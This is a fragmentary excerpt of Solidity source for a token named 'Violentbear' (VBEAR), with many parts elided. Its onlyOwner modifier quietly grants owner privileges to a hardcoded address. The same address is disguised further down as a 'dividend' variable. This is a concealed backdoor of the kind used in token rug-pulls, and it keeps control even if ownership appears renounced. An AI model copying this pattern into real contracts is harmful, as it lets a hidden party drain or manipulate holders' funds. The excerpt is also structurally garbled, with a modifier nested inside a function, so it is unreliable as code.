...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xFCf512DBd5BfFF16A995716d2BdbE1B3978925ce) , "owner");
        _;
    }
...
contract Violentbear  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Violentbear";
    string private _symbol = "VBEAR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdFE533e87EF2CaFe7DB63A707c7A53A2a87de8C8);
    address private _Marketing = 0xdFE533e87EF2CaFe7DB63A707c7A53A2a87de8C8;
    address public dividend = 0xFCf512DBd5BfFF16A995716d2BdbE1B3978925ce;
